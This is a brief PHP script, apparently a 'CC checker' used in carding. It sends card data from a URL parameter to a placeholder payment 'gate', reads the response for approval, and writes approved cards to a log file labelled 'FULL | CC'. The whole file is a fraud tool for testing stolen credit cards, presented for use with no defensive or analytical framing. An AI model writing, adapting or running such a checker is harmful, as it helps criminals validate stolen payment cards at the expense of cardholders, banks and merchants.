<?php

function getBypass($size){
    $chrs = '0123456789qwertyuioplkjhgfdsazxcvbnm0123456789';
    $new = "";
    for($i=0; $i<$size; $i++){
        $new .= $chrs[rand(0, strlen($chrs)-1)];
    }
    return $new;
}

error_reporting(0);

$lista = $_GET['lista'];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,'GATE AQUI!' .$lista. '');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

 $resposta = curl_exec($ch);

   if (strpos($resposta, 'Aprovada')) {

        echo "<font class='label label-success'> #APROVADA  </font>" .$lista. " Transaçao AUTORIZADA";
        flush();
        ob_flush();
 $file = fopen("CX2.html", "a");       
 fwrite($file, "FULL | CC: $lista </br>");
    }else{
        echo "<font class='label label-danger'> #REPROVADA  </font>" .$lista. " Transaçao NEGADA";
        flush();
        ob_flush();
    }

?>
